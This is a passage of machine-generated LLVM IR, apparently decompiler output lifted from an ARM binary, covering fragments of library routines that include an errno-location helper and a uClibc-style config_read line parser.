  %v2_193f0 = add i32 %v1_193f0, 4
  %v3_193f0 = inttoptr i32 %v2_193f0 to i32*
  store i32 %v0_193f0, i32* %v3_193f0, align 4
  %v0_193f4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_193f4

dec_label_pc_193f4:                               ; preds = %dec_label_pc_193c4, %dec_label_pc_193ec
  %v1_19418 = phi i32 [ %v0_193c4, %dec_label_pc_193c4 ], [ %v0_193f4.pre, %dec_label_pc_193ec ]
  %v1_193f4 = add i32 %v1_19418, 4
  %v2_193f4 = inttoptr i32 %v1_193f4 to i32*
  %v3_193f4 = load i32, i32* %v2_193f4, align 4
  %v1_193f8 = add i32 %v1_19418, 12
  %v2_193f8 = inttoptr i32 %v1_193f8 to i32*
  %v3_193f8 = load i32, i32* %v2_193f8, align 4
  %v2_193fc = add i32 %v3_193f8, %v3_193f4
  store i32 %v2_193fc, i32* @r4, align 4
  %v3_19400 = inttoptr i32 %v2_193fc to i32*
  %v4_19400 = load i32, i32* %v3_19400, align 4
  %v1_19404 = add i32 %v2_193fc, 4
  %v2_19404 = inttoptr i32 %v1_19404 to i32*
  %v3_19404 = load i32, i32* %v2_19404, align 4
  %v1_19408 = add i32 %v2_193fc, 16
  %v2_19408 = inttoptr i32 %v1_19408 to i16*
  %v3_19408 = load i16, i16* %v2_19408, align 2
  %v4_19408 = zext i16 %v3_19408 to i32
  %v1_1940c = add i32 %v2_193fc, 8
  %v2_1940c = inttoptr i32 %v1_1940c to i32*
  %v3_1940c = load i32, i32* %v2_1940c, align 4
  store i32 %v3_1940c, i32* %ip.global-to-local, align 4
  %v2_19410 = add i32 %v4_19408, %v3_193f4
  %v2_19414 = or i32 %v3_19404, %v4_19400
  %v4_19414 = icmp eq i32 %v2_19414, 0
  store i32 %v2_19410, i32* %v2_193f4, align 4
  %v0_1941c = load i32, i32* %ip.global-to-local, align 4
  %v1_1941c = load i32, i32* @r5, align 4
  %v2_1941c = add i32 %v1_1941c, 16
  %v3_1941c = inttoptr i32 %v2_1941c to i32*
  store i32 %v0_1941c, i32* %v3_1941c, align 4
  br i1 %v4_19414, label %dec_label_pc_193c4, label %dec_label_pc_19424

dec_label_pc_19424:                               ; preds = %dec_label_pc_193f4, %.thread
  %v0_19430 = load i32, i32* @r6, align 4
  %v2_19430 = add i32 %v0_19430, 28
  %v3_19430 = inttoptr i32 %v2_19430 to i32*
  %v4_19430 = load i32, i32* %v3_19430, align 4
  store i32 %v4_19430, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_19430)
  %v0_1943c = load i32, i32* @r4, align 4
  ret i32 %v0_1943c

; uselistorder directives
  uselistorder i32 %v2_193fc, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_19418, { 1, 0 }
  uselistorder i32 %v6_193c4, { 1, 0 }
  uselistorder i32 %v0_193c4, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_193f4, { 1, 0 }
}

define i32 @function_19450(i32 %arg1) local_unnamed_addr {
dec_label_pc_19450:
  %v0_19450 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_19450, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_19450
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_19450, %bb
  %v10_1945c = phi i32 [ %arg1, %dec_label_pc_19450 ], [ 0, %bb ]
  ret i32 %v10_1945c

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 26352)
}

define i32 @__GI_config_read(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_1947c = load i32, i32* @r4, align 4
  %v6_1947c = load i32, i32* @r5, align 4
  %v9_1947c = load i32, i32* @r6, align 4
  %v12_1947c = load i32, i32* @r7, align 4
  %v15_1947c = load i32, i32* @r8, align 4
  %v18_1947c = load i32, i32* @sb, align 4
  %v21_1947c = load i32, i32* @sl, align 4
  %v24_1947c = load i32, i32* @fp, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_19480 = icmp eq i32* %arg1, null
  store i1 %v2_19480, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v2_19480, label %dec_label_pc_19790, label %dec_label_pc_19498

dec_label_pc_19498:                               ; preds = %entry
  %v1_19498 = urem i32 %arg3, 256
  store i32 %v1_19498, i32* @sb, align 4
  %v1_1949c = and i32 %arg3, ptrtoint (i32* @global_var_ff00.40 to i32)
  %v3_194a0 = udiv i32 %v1_1949c, 256
  %v3_194a4 = mul nuw nsw i32 %v1_19498, 4
  %v1_194ac = or i32 %v3_194a4, 1
  %v1_194b8 = and i32 %arg3, 131072
  %v1_194bc = add nsw i32 %v1_19498, -1
  %v1_194c8 = and i32 %arg3, 262144
  store i32 %v1_194c8, i32* %r2.global-to-local, align 4
  %v1_194cc = and i32 %arg3, 65536
  store i32 %v1_194cc, i32* %r3.global-to-local, align 4
  store i32 %v1_194cc, i32* %stack_var_-72, align 4
  store i32 0, i32* @fp, align 4
  %v1_194dc = add i32 %arg4, 1
  store i32 %v1_194dc, i32* @sl, align 4
  %v2_1965c = inttoptr i32 %arg2 to i32*
  %v2_1966c = icmp eq i32 %v1_194b8, 0
  %v2_196c4 = icmp eq i32 %v1_194c8, 0
  br label %dec_label_pc_194e0

dec_label_pc_194e0:                               ; preds = %dec_label_pc_194e0.backedge, %dec_label_pc_19498
  %v2_194fc = phi i32 [ %v0_194e0.pre, %dec_label_pc_194e0.backedge ], [ %tmp, %dec_label_pc_19498 ]
  %v1_194e0 = add i32 %v2_194fc, 4
  %v2_194e0 = inttoptr i32 %v1_194e0 to i32*
  %v3_194e0 = load i32, i32* %v2_194e0, align 4
  store i32 %v3_194e0, i32* %r3.global-to-local, align 4
  %v2_194e4 = icmp eq i32 %v3_194e0, 0
  store i1 %v2_194e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_194e4, label %dec_label_pc_194ec, label %dec_label_pc_19534

dec_label_pc_194ec:                               ; preds = %dec_label_pc_194e0
  %v1_194ec = add i32 %v2_194fc, 16
  %v2_194ec = inttoptr i32 %v1_194ec to i32*
  %v3_194ec = load i32, i32* %v2_194ec, align 4
  store i32 %v3_194ec, i32* %r3.global-to-local, align 4
  %v2_194f0 = icmp eq i32 %v3_194ec, 0
  store i1 %v2_194f0, i1* %cpsr_z.global-to-local, align 1
  %v1_194f4 = add i32 %v2_194fc, 8
  %v2_194f4 = inttoptr i32 %v1_194f4 to i32*
  %v3_194f4 = load i32, i32* %v2_194f4, align 4
  store i32 %v3_194f4, i32* %r3.global-to-local, align 4
  br i1 %v2_194f0, label %bb, label %bb66

bb:                                               ; preds = %dec_label_pc_194ec
  store i32 81, i32* %r2.global-to-local, align 4
  store i32 81, i32* %v2_194ec, align 4
  %v0_19500.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_194ec, %bb
  %v0_19500 = phi i32 [ %v0_19500.pre, %bb ], [ %v3_194f4, %dec_label_pc_194ec ]
  %v2_19500 = icmp eq i32 %v0_19500, 0
  store i1 %v2_19500, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19500, label %bb67, label %.thread

bb67:                                             ; preds = %bb66
  store i32 %v1_194ac, i32* %r3.global-to-local, align 4
  %v2_19508 = load i32, i32* @r5, align 4
  %v3_19508 = add i32 %v2_19508, 8
  %v4_19508 = inttoptr i32 %v3_19508 to i32*
  store i32 %v1_194ac, i32* %v4_19508, align 4
  br label %.thread

.thread:                                          ; preds = %bb66, %bb67
  %v0_1950c = load i32, i32* @r5, align 4
  %v1_1950c = add i32 %v0_1950c, 16
  %v2_1950c = inttoptr i32 %v1_1950c to i32*
  %v3_1950c = load i32, i32* %v2_1950c, align 4
  store i32 %v3_1950c, i32* %r0.global-to-local, align 4
  %v1_19510 = add i32 %v0_1950c, 8
  %v2_19510 = inttoptr i32 %v1_19510 to i32*
  %v3_19510 = load i32, i32* %v2_19510, align 4
  store i32 %v3_19510, i32* %r3.global-to-local, align 4
  %v2_19514 = add i32 %v3_19510, %v3_1950c
  store i32 %v2_19514, i32* %r0.global-to-local, align 4
  %v1_19518 = call i32 @malloc(i32 %v2_19514)
  store i32 %v1_19518, i32* %r0.global-to-local, align 4
  %v2_1951c = icmp eq i32 %v1_19518, 0
  store i1 %v2_1951c, i1* %cpsr_z.global-to-local, align 1
  %v1_19520 = load i32, i32* @r5, align 4
  %v2_19520 = add i32 %v1_19520, 4
  %v3_19520 = inttoptr i32 %v2_19520 to i32*
  store i32 %v1_19518, i32* %v3_19520, align 4
  br i1 %v2_1951c, label %dec_label_pc_19790, label %dec_label_pc_19528

dec_label_pc_19528:                               ; preds = %.thread
  %v0_19528 = load i32, i32* @r5, align 4
  %v1_19528 = add i32 %v0_19528, 20
  %v2_19528 = inttoptr i32 %v1_19528 to i32*
  %v3_19528 = load i32, i32* %v2_19528, align 4
  %v1_1952c = or i32 %v3_19528, 1
  store i32 %v1_1952c, i32* %r3.global-to-local, align 4
  store i32 %v1_1952c, i32* %v2_19528, align 4
  %v0_19534.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_19534

dec_label_pc_19534:                               ; preds = %dec_label_pc_194e0, %dec_label_pc_19528
  %v1_1953c = phi i32 [ %v2_194fc, %dec_label_pc_194e0 ], [ %v0_19534.pre, %dec_label_pc_19528 ]
  %v1_19534 = add i32 %v1_1953c, 4
  %v2_19534 = inttoptr i32 %v1_19534 to i32*
  %v3_19534 = load i32, i32* %v2_19534, align 4
  store i32 %v3_19534, i32* %r2.global-to-local, align 4
  %v4_19534 = add i32 %v1_1953c, 8
  %v5_19534 = inttoptr i32 %v4_19534 to i32*
  %v6_19534 = load i32, i32* %v5_19534, align 4
  %v2_19538 = add i32 %v6_19534, %v3_19534
  store i32 %v2_19538, i32* %r3.global-to-local, align 4
  %v2_1953c = add i32 %v1_1953c, 12
  %v3_1953c = inttoptr i32 %v2_1953c to i32*
  store i32 %v2_19538, i32* %v3_1953c, align 4
  %v0_19540 = load i32, i32* @fp, align 4
  store i32 %v0_19540, i32* @r6, align 4
  br label %dec_label_pc_19544

dec_label_pc_19544:                               ; preds = %dec_label_pc_195d0, %dec_label_pc_195bc, %dec_label_pc_19534
  %v0_1954c = phi i32 [ %v0_19540, %dec_label_pc_19534 ], [ %v1_195bc, %dec_label_pc_195bc ], [ %v0_1954c.pre.pre, %dec_label_pc_195d0 ]
  %v0_19544 = load i32, i32* @r5, align 4
  %v1_19544 = add i32 %v0_19544, 12
  store i32 %v1_19544, i32* %r0.global-to-local, align 4
  %v1_19548 = inttoptr i32 %v1_19544 to i32*
  %v2_19548 = load i32, i32* %v1_19548, align 4
  store i32 %v2_19548, i32* %r0.global-to-local, align 4
  %v3_19548 = add i32 %v0_19544, 16
  %v4_19548 = inttoptr i32 %v3_19548 to i32*
  %v5_19548 = load i32, i32* %v4_19548, align 4
  %v2_1954c = add i32 %v2_19548, %v0_1954c
  store i32 %v2_1954c, i32* %r0.global-to-local, align 4
  %v2_19550 = sub i32 %v5_19548, %v0_1954c
  %v1_19554 = inttoptr i32 %v0_19544 to i32*
  %v2_19554 = load i32, i32* %v1_19554, align 4
  store i32 %v2_19554, i32* %r2.global-to-local, align 4
  %v3_19558 = call i32 @fgets(i32 %v2_1954c, i32 %v2_19550, i32 %v2_19554)
  store i32 %v3_19558, i32* %r0.global-to-local, align 4
  store i32 %v3_19558, i32* %r4.global-to-local, align 4
  %v2_1955c = icmp eq i32 %v3_19558, 0
  store i1 %v2_1955c, i1* %cpsr_z.global-to-local, align 1
  %v0_19564 = load i32, i32* @r5, align 4
  %v1_19564 = add i32 %v0_19564, 12
  br i1 %v2_1955c, label %dec_label_pc_19564, label %dec_label_pc_1957c

dec_label_pc_19564:                               ; preds = %dec_label_pc_19544
  store i32 %v1_19564, i32* %r0.global-to-local, align 4
  %v1_19568 = inttoptr i32 %v1_19564 to i32*
  %v2_19568 = load i32, i32* %v1_19568, align 4
  store i32 %v2_19568, i32* %r0.global-to-local, align 4
  %v3_19568 = add i32 %v0_19564, 16
  %v4_19568 = inttoptr i32 %v3_19568 to i32*
  %v5_19568 = load i32, i32* %v4_19568, align 4
  store i32 %v5_19568, i32* @r2, align 4
  %v2_19570 = inttoptr i32 %v2_19568 to i8*
  %v3_19570 = call i32 @__GI_memset(i8* %v2_19570, i32 0)
  store i32 %v3_19570, i32* %r0.global-to-local, align 4
  %v0_19574 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_19794

dec_label_pc_1957c:                               ; preds = %dec_label_pc_19544
  %v2_1957c = inttoptr i32 %v1_19564 to i32*
  %v3_1957c = load i32, i32* %v2_1957c, align 4
  store i32 %v3_1957c, i32* @r4, align 4
  %v1_19580 = load i32, i32* @r6, align 4
  %v2_19580 = add i32 %v1_19580, %v3_1957c
  %v3_19580 = inttoptr i32 %v2_19580 to i8*
  store i32 %v2_19580, i32* %r0.global-to-local, align 4
  %v3_19584 = call i32 @strlen(i8* %v3_19580)
  %v0_1958c = load i32, i32* @r6, align 4
  %v2_1958c = add i32 %v0_1958c, %v3_19584
  store i32 %v2_1958c, i32* @r6, align 4
  %v0_19590 = load i32, i32* @r4, align 4
  store i32 %v0_19590, i32* @r0, align 4
  %v2_19594 = call i32 @__GI_strchr(i32 %v0_19590, i32 10)
  store i32 %v2_19594, i32* %r0.global-to-local, align 4
  %v2_19598 = icmp eq i32 %v2_19594, 0
  store i1 %v2_19598, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19598, label %dec_label_pc_195c4, label %dec_label_pc_195a0

dec_label_pc_195a0:                               ; preds = %dec_label_pc_1957c
  %v1_195a0 = inttoptr i32 %v2_19594 to i8*
  %v2_195a0 = load i8, i8* %v1_195a0, align 1
  %v3_195a0 = zext i8 %v2_195a0 to i32
  %v1_195a4 = add nuw nsw i32 %v3_195a0, 255
  %v1_195a8 = urem i32 %v1_195a4, 256
  store i32 %v1_195a8, i32* %r3.global-to-local, align 4
  %v7_195ac = icmp eq i32 %v1_195a8, 92
  store i1 %v7_195ac, i1* %cpsr_z.global-to-local, align 1
  %v1_195b0 = trunc i32 %v1_195a4 to i8
  store i8 %v1_195b0, i8* %v1_195a0, align 1
  %v0_195b4 = load i32, i32* @r6, align 4
  %v1_195b4 = add i32 %v0_195b4, -1
  store i32 %v1_195b4, i32* @r6, align 4
  %v0_195b8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_195b8, label %dec_label_pc_195bc, label %dec_label_pc_19648

dec_label_pc_195bc:                               ; preds = %dec_label_pc_195a0
  %v1_195bc = add i32 %v0_195b4, -2
  store i32 %v1_195bc, i32* @r6, align 4
  br label %dec_label_pc_19544

dec_label_pc_195c4:                               ; preds = %dec_label_pc_1957c
  %v0_195c4 = load i32, i32* @r5, align 4
  %v1_195c4 = add i32 %v0_195c4, 20
  %v2_195c4 = inttoptr i32 %v1_195c4 to i32*
  %v3_195c4 = load i32, i32* %v2_195c4, align 4
  store i32 %v3_195c4, i32* %r3.global-to-local, align 4
  %v2_195c8 = icmp eq i32 %v3_195c4, 0
  store i1 %v2_195c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_195c8, label %dec_label_pc_19600, label %dec_label_pc_195d0

dec_label_pc_195d0:                               ; preds = %dec_label_pc_195c4
  %v1_195d0 = add i32 %v0_195c4, 16
  %v2_195d0 = inttoptr i32 %v1_195d0 to i32*
  %v3_195d0 = load i32, i32* %v2_195d0, align 4
  store i32 %v3_195d0, i32* %r3.global-to-local, align 4
  %v1_195d4 = add i32 %v0_195c4, 8
  %v2_195d4 = inttoptr i32 %v1_195d4 to i32*
  %v3_195d4 = load i32, i32* %v2_195d4, align 4
  %v1_195d8 = add i32 %v3_195d0, 4096
  store i32 %v1_195d8, i32* %r3.global-to-local, align 4
  %v2_195dc = add i32 %v3_195d4, %v1_195d8
  store i32 %v1_195d8, i32* %v2_195d0, align 4
  %v0_195e4 = load i32, i32* @r5, align 4
  %v1_195e4 = add i32 %v0_195e4, 4
  %v2_195e4 = inttoptr i32 %v1_195e4 to i32*
  %v3_195e4 = load i32, i32* %v2_195e4, align 4
  store i32 %v3_195e4, i32* %r0.global-to-local, align 4
  %v2_195e8 = inttoptr i32 %v3_195e4 to i32*
  %v3_195e8 = call i32 @realloc(i32* %v2_195e8, i32 %v2_195dc)
  store i32 %v3_195e8, i32* %r0.global-to-local, align 4
  %v0_195ec = load i32, i32* @r5, align 4
  %v1_195ec = add i32 %v0_195ec, 8
  %v2_195ec = inttoptr i32 %v1_195ec to i32*
  %v3_195ec = load i32, i32* %v2_195ec, align 4
  %v2_195f0 = add i32 %v3_195ec, %v3_195e8
  store i32 %v2_195f0, i32* %r3.global-to-local, align 4
  %v2_195f4 = add i32 %v0_195ec, 12
  %v3_195f4 = inttoptr i32 %v2_195f4 to i32*
  store i32 %v2_195f0, i32* %v3_195f4, align 4
  %v1_195f8 = load i32, i32* @r5, align 4
  %v2_195f8 = add i32 %v1_195f8, 4
  %v3_195f8 = inttoptr i32 %v2_195f8 to i32*
  store i32 %v3_195e8, i32* %v3_195f8, align 4
  %v0_1954c.pre.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_19544

dec_label_pc_19600:                               ; preds = %dec_label_pc_195c4, %.dec_label_pc_19600_crit_edge
  %v0_19600 = phi i32 [ %v0_19600.pre, %.dec_label_pc_19600_crit_edge ], [ %v0_195c4, %dec_label_pc_195c4 ]
  %v1_19600 = inttoptr i32 %v0_19600 to i32*
  %v2_19600 = load i32, i32* %v1_19600, align 4
  %v1_19604 = add i32 %v2_19600, 52
  %v2_19604 = inttoptr i32 %v1_19604 to i32*
  %v3_19604 = load i32, i32* %v2_19604, align 4
  store i32 %v3_19604, i32* %r3.global-to-local, align 4
  %v2_19608 = icmp eq i32 %v3_19604, 0
  store i1 %v2_19608, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19608, label %dec_label_pc_19634, label %dec_label_pc_19610

dec_label_pc_19610:                               ; preds = %dec_label_pc_19600
  %v1_19610 = add i32 %v2_19600, 16
  %v2_19610 = inttoptr i32 %v1_19610 to i32*
  %v3_19610 = load i32, i32* %v2_19610, align 4
  store i32 %v3_19610, i32* %r2.global-to-local, align 4
  %v1_19614 = add i32 %v2_19600, 24
  %v2_19614 = inttoptr i32 %v1_19614 to i32*
  %v3_19614 = load i32, i32* %v2_19614, align 4
  store i32 %v3_19614, i32* %r3.global-to-local, align 4
  %v3_19618 = icmp ult i32 %v3_19610, %v3_19614
  %v9_19618 = icmp eq i32 %v3_19610, %v3_19614
  store i1 %v9_19618, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_19618, label %dec_label_pc_1963cthread-pre-split, label %dec_label_pc_19628

dec_label_pc_19628:                               ; preds = %dec_label_pc_19610
  store i32 %v2_19600, i32* %r0.global-to-local, align 4
  %v1_1962c = inttoptr i32 %v2_19600 to i16*
  %v2_1962c = call i32 @getc_unlocked(i16* %v1_1962c)
  store i32 %v2_1962c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1963c

dec_label_pc_19634:                               ; preds = %dec_label_pc_19600
  store i32 %v2_19600, i32* %r0.global-to-local, align 4
  %v1_19638 = call i32 @__GI_fgetc(i32 %v2_19600)
  store i32 %v1_19638, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1963c

dec_label_pc_1963cthread-pre-split:               ; preds = %dec_label_pc_19610
  %v2_1961c = inttoptr i32 %v3_19610 to i8*
  %v3_1961c = load i8, i8* %v2_1961c, align 1
  %v4_1961c = zext i8 %v3_1961c to i32
  store i32 %v4_1961c, i32* %r0.global-to-local, align 4
  %v6_1961c = add i32 %v3_19610, 1
  store i32 %v6_1961c, i32* %r2.global-to-local, align 4
  store i32 %v6_1961c, i32* %v2_19610, align 4
  %v0_1963c.pr = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1963c

dec_label_pc_1963c:                               ; preds = %dec_label_pc_1963cthread-pre-split, %dec_label_pc_19628, %dec_label_pc_19634
  %v1_19640 = phi i32 [ %v0_1963c.pr, %dec_label_pc_1963cthread-pre-split ], [ %v2_1962c, %dec_label_pc_19628 ], [ %v1_19638, %dec_label_pc_19634 ]
  %v7_1963c = icmp eq i32 %v1_19640, 10
  store i1 %v7_1963c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1963c, label %dec_label_pc_19648.loopexit, label %bb68

bb68:                                             ; preds = %dec_label_pc_1963c
  %v8_19640 = icmp eq i32 %v1_19640, -1
  store i1 %v8_19640, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_19640, label %dec_label_pc_19648.loopexit, label %.dec_label_pc_19600_crit_edge

.dec_label_pc_19600_crit_edge:                    ; preds = %bb68
  %v0_19600.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_19600

dec_label_pc_19648.loopexit:                      ; preds = %bb68, %dec_label_pc_1963c
  %v0_19648.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_19648

dec_label_pc_19648:                               ; preds = %dec_label_pc_195a0, %dec_label_pc_19648.loopexit
  %v0_19648 = phi i32 [ %v0_19648.pre, %dec_label_pc_19648.loopexit ], [ %v1_195b4, %dec_label_pc_195a0 ]
  %v7_19648 = icmp eq i32 %v0_19648, -1
  store i1 %v7_19648, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19648, label %dec_label_pc_19790, label %dec_label_pc_19650

dec_label_pc_19650:                               ; preds = %dec_label_pc_19648
  %v0_19650 = load i32, i32* @r5, align 4
  %v1_19650 = add i32 %v0_19650, 4
  %v2_19650 = inttoptr i32 %v1_19650 to i32*
  %v3_19650 = load i32, i32* %v2_19650, align 4
  store i32 %v3_19650, i32* %r0.global-to-local, align 4
  store i32 %v3_194a4, i32* @r2, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  store i32 %v3_19650, i32* %v2_1965c, align 4
  %v0_19660 = load i32, i32* @fp, align 4
  %v2_19664 = inttoptr i32 %v3_19650 to i8*
  %v3_19664 = call i32 @__GI_memset(i8* %v2_19664, i32 %v0_19660)
  store i32 %v3_19664, i32* %r0.global-to-local, align 4
  store i32 %v1_194b8, i32* %r2.global-to-local, align 4
  store i1 %v2_1966c, i1* %cpsr_z.global-to-local, align 1
  %v0_19670 = load i32, i32* @r5, align 4
  %v1_19670 = add i32 %v0_19670, 12
  %v2_19670 = inttoptr i32 %v1_19670 to i32*
  %v3_19670 = load i32, i32* %v2_19670, align 4
  store i32 %v3_19670, i32* @r4, align 4
  br i1 %v2_1966c, label %dec_label_pc_19688, label %dec_label_pc_19678

dec_label_pc_19678:                               ; preds = %dec_label_pc_19650
  store i32 %v3_19670, i32* @r0, align 4
  %v1_19680 = inttoptr i32 %v3_19670 to i8*
  %v2_19680 = call i32 @__GI_strspn(i8* %v1_19680)
  store i32 %v2_19680, i32* %r0.global-to-local, align 4
  %v0_19684 = load i32, i32* @r4, align 4
  %v2_19684 = add i32 %v0_19684, %v2_19680
  store i32 %v2_19684, i32* @r4, align 4
  br label %dec_label_pc_19688

dec_label_pc_19688:                               ; preds = %dec_label_pc_19650, %dec_label_pc_19678
  %v0_1976013 = phi i32 [ %v3_19670, %dec_label_pc_19650 ], [ %v2_19684, %dec_label_pc_19678 ]
  %v1_19688 = inttoptr i32 %v0_1976013 to i8*
  %v2_19688 = load i8, i8* %v1_19688, align 1
  %v3_19688 = zext i8 %v2_19688 to i32
  store i32 %v3_19688, i32* %r2.global-to-local, align 4
  %v2_1968c = icmp eq i8 %v2_19688, 0
  store i1 %v2_1968c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1968c, label %dec_label_pc_194e0.backedge, label %dec_label_pc_19694

dec_label_pc_194e0.backedge:                      ; preds = %dec_label_pc_19688, %dec_label_pc_19788, %dec_label_pc_19694
  %v0_194e0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_194e0

dec_label_pc_19694:                               ; preds = %dec_label_pc_19688
  %v0_19694 = load i32, i32* @r7, align 4
  %v1_19694 = inttoptr i32 %v0_19694 to i8*
  %v2_19694 = load i8, i8* %v1_19694, align 1
  %v3_19694 = zext i8 %v2_19694 to i32
  store i32 %v3_19694, i32* %r3.global-to-local, align 4
  %v9_19698 = icmp eq i8 %v2_19694, %v2_19688
  store i1 %v9_19698, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_19698, label %dec_label_pc_194e0.backedge, label %dec_label_pc_19760.preheader

dec_label_pc_19760.preheader:                     ; preds = %dec_label_pc_19694
  %v1_1969c = load i32, i32* @fp, align 4
  store i32 %v1_1969c, i32* @r6, align 4
  %v2_1976015 = load i8, i8* %v1_19688, align 1
  %v3_1976016 = zext i8 %v2_1976015 to i32
  store i32 %v3_1976016, i32* %r2.global-to-local, align 4
  %v2_1976417 = icmp eq i8 %v2_1976015, 0
  store i1 %v2_1976417, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1976417, label %dec_label_pc_1977c, label %dec_label_pc_1976c.preheader

dec_label_pc_1976c.preheader:                     ; preds = %dec_label_pc_19760.preheader
  %v2_1976c82 = load i8, i8* %v1_19694, align 1
  %v3_1976c83 = zext i8 %v2_1976c82 to i32
  store i32 %v3_1976c83, i32* %r3.global-to-local, align 4
  %v9_1977086 = icmp eq i8 %v2_1976c82, %v2_1976015
  store i1 %v9_1977086, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1977086, label %dec_label_pc_1977c, label %bb74

dec_label_pc_196a8:                               ; preds = %bb74
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v2_196ac = load i32, i32* %v2_1965c, align 4
  store i32 %v2_196ac, i32* %r3.global-to-local, align 4
  store i32 %v1_194bc, i32* %r2.global-to-local, align 4
  %v9_196b4 = icmp eq i32 %v2_196b888, %v1_194bc
  store i1 %v9_196b4, i1* %cpsr_z.global-to-local, align 1
  %v5_196b8 = mul i32 %v2_196b888, 4
  %v6_196b8 = add i32 %v2_196ac, %v5_196b8
  %v7_196b8 = inttoptr i32 %v6_196b8 to i32*
  store i32 %v0_196b887, i32* %v7_196b8, align 4
  br i1 %v9_196b4, label %dec_label_pc_196c0, label %dec_label_pc_196cc

dec_label_pc_196c0:                               ; preds = %dec_label_pc_196a8
  store i32 %v1_194c8, i32* %r3.global-to-local, align 4
  store i1 %v2_196c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_196c4, label %dec_label_pc_196cc, label %dec_label_pc_196ec

dec_label_pc_196cc:                               ; preds = %dec_label_pc_196c0, %dec_label_pc_196a8
  %v0_196cc = load i32, i32* @r7, align 4
  %v1_196cc = inttoptr i32 %v0_196cc to i8*
  %v2_196cc = load i8, i8* %v1_196cc, align 1
  %v3_196cc = zext i8 %v2_196cc to i32
  store i32 %v3_196cc, i32* %r3.global-to-local, align 4
  %v2_196d0 = icmp eq i8 %v2_196cc, 0
  store i1 %v2_196d0, i1* %cpsr_z.global-to-local, align 1
  %v0_196d4 = load i32, i32* @r4, align 4
  store i32 %v0_196d4, i32* @r0, align 4
  %v1_196d8 = load i32, i32* @sl, align 4
  %storemerge = select i1 %v2_196d0, i32 %v1_196d8, i32 %v0_196cc
  store i32 %storemerge, i32* @r1, align 4
  %v0_196e0 = call i32 @strcspn()
  store i32 %v0_196e0, i32* %r0.global-to-local, align 4
  %v0_196e4 = load i32, i32* @r4, align 4
  %v2_196e4 = add i32 %v0_196e4, %v0_196e0
  store i32 %v2_196e4, i32* @r4, align 4
  br label %dec_label_pc_19724

dec_label_pc_196ec:                               ; preds = %dec_label_pc_196c0
  %v0_196ec = load i32, i32* @r4, align 4
  store i32 %v0_196ec, i32* @r0, align 4
  %v0_196f0 = load i32, i32* @r7, align 4
  %v1_196f0 = inttoptr i32 %v0_196f0 to i8*
  %v2_196f0 = load i8, i8* %v1_196f0, align 1
  %v3_196f0 = zext i8 %v2_196f0 to i32
  %v5_196f4 = call i32 @__GI_strchrnul(i32 %v0_196ec, i32 %v3_196f0, i32 %v1_194bc, i32 %v1_194c8)
  store i32 %v5_196f4, i32* %r0.global-to-local, align 4
  store i32 %v1_194b8, i32* %r2.global-to-local, align 4
  store i1 %v2_1966c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_196f4, i32* @r4, align 4
  br i1 %v2_1966c, label %dec_label_pc_19724, label %dec_label_pc_19710

dec_label_pc_1970c:                               ; preds = %dec_label_pc_19710
  %v1_1970c = add i32 %v0_19724.pre, -1
  store i32 %v1_1970c, i32* @r4, align 4
  br label %dec_label_pc_19710

dec_label_pc_19710:                               ; preds = %dec_label_pc_196ec, %dec_label_pc_1970c
  %v0_19710 = phi i32 [ %v1_1970c, %dec_label_pc_1970c ], [ %v5_196f4, %dec_label_pc_196ec ]
  %v1_19710 = add i32 %v0_19710, -1
  %v2_19710 = inttoptr i32 %v1_19710 to i8*
  %v3_19710 = load i8, i8* %v2_19710, align 1
  %v4_19710 = zext i8 %v3_19710 to i32
  %v0_19714 = load i32, i32* @sl, align 4
  store i32 %v0_19714, i32* @r0, align 4
